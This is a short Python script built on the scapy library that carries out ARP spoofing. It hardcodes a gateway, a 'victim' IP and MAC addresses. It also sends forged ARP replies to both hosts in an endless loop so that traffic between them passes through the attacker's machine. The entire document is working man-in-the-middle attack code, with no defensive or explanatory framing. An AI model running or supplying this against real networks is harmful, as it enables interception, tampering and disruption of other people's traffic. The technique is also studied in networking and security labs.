from scapy.all import *


def main():
    gatewayIP = '192.168.82.2'
    victimIP = '192.168.82.156'

    hackMAC = '00:0c:29:f5:eb:46'
    victimMAC = '00:0c:29:08:17:1c'
    gatewayMAC = '00:50:56:e4:33:f2'

    packet1 = Ether(src=hackMAC,dst=victimMAC)/ARP(hwsrc=hackMAC,hwdst=victimMAC,psrc=gatewayIP,pdst=victimIP,op=2)
    packet2 = Ether(src=hackMAC,dst=gatewayMAC)/ARP(hwsrc=hackMAC,hwdst=gatewayMAC,psrc=victimIP,pdst=gatewayIP,op=2)
    while True:
        sendp(packet1,iface="eth0",verbose=False)
        sendp(packet2,iface="eth0",verbose=False)
        time.sleep(1)
        print(packet1.show())
        print(packet2.show())
    pass


if __name__ == '__main__':
    main()